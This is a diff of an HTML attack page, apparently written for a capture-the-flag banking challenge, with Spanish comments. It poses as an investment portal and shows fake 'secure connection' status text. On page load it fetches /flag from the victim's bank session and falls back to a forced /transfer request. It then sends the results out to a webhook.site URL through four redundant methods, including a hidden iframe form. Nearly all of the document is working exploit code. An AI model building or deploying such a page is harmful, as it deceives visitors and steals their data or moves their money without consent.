@@ -1,35 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Easy Money - Investment Platform</title>
-    <style>
-        body { font-family: Arial; padding: 40px; background: #1a1a1a; color: white; }
-        .header { text-align: center; margin-bottom: 40px; }
-        .features { display: flex; justify-content: space-around; margin: 40px 0; }
-        .feature { text-align: center; padding: 20px; }
-    </style>
+    <title>Exclusive Investment Opportunity</title>
 </head>
 <body>
-    <div class="header">
-        <h1>🚀 Easy Money Investment Platform</h1>
-        <p>High-return investment opportunities for exclusive clients</p>
-    </div>
-    
-    <div class="features">
-        <div class="feature">
-            <h3>15% Monthly Returns</h3>
-            <p>Guanteed high-yield investments</p>
-        </div>
-        <div class="feature">
-            <h3>Secure Platform</h3>
-            <p>Bank-level security</p>
-        </div>
-    </div>
+    <h1>Secure Investment Portal</h1>
+    <div id="status">Initializing secure connection...</div>
 
     <script>
-        // Tu exploit aquí (el mismo código anterior)
+        // Webhook - VERIFICA QUE ESTÉ CORRECTO
         const WEBHOOK = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
         
+        // Función para enviar datos
+        function exfiltrate(data) {
+            console.log("Exfiltrating:", data);
+            
+            // Método 1: Image (más confiable)
+            var img1 = new Image();
+            img1.src = WEBHOOK + "?method=img1&data=" + encodeURIComponent(data.substring(0, 1000));
+            
+            // Método 2: Fetch
+            fetch(WEBHOOK, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'data=' + encodeURIComponent(data)
+            }).catch(e => console.log("Fetch error"));
+            
+            // Método 3: Navigator.sendBeacon
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(WEBHOOK, 'data=' + encodeURIComponent(data));
+            }
+            
+            // Método 4: Form submission
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = WEBHOOK;
+            form.target = 'hiddenFrame';
+            var input = document.createElement('input');
+            input.name = 'data';
+            input.value = data;
+            form.appendChild(input);
+            document.body.appendChild(form);
+            
+            var iframe = document.createElement('iframe');
+            iframe.name = 'hiddenFrame';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            
+            form.submit();
+        }
+
+        // Función post del banco
         function post(url, params={}){
             var params_post = [];
             for(const key in params){
@@ -42,16 +64,36 @@
             return xhr.responseText;
         }
 
-        setTimeout(function() {
-            try {
-                var flag = post("/flag");
-                var img = new Image();
-                img.src = WEBHOOK + "?flag=" + encodeURIComponent(flag);
-            } catch(e) {
-                var img = new Image();
-                img.src = WEBHOOK + "?error=" + encodeURIComponent(e.toString());
-            }
-        }, 2000);
+        // Ejecutar cuando cargue la página
+        window.onload = function() {
+            document.getElementById('status').textContent = "Checking authentication...";
+            exfiltrate("Page loaded successfully");
+            
+            setTimeout(function() {
+                try {
+                    document.getElementById('status').textContent = "Accessing privileged data...";
+                    
+                    // Intentar obtener la flag
+                    var flag = post("/flag");
+                    exfiltrate("SUCCESS - Flag: " + flag);
+                    document.getElementById('status').textContent = "Data retrieved successfully!";
+                    
+                } catch(error) {
+                    exfiltrate("ERROR accessing /flag: " + error.toString());
+                    
+                    // Intentar transferencia como fallback
+                    try {
+                        var transfer = post("/transfer", {
+                            recipient: "a", 
+                            amount: "100"
+                        });
+                        exfiltrate("Transfer result: " + transfer);
+                    } catch(e) {
+                        exfiltrate("Transfer error: " + e.toString());
+                    }
+                }
+            }, 1000);
+        };
     </script>
 </body>
 </html>
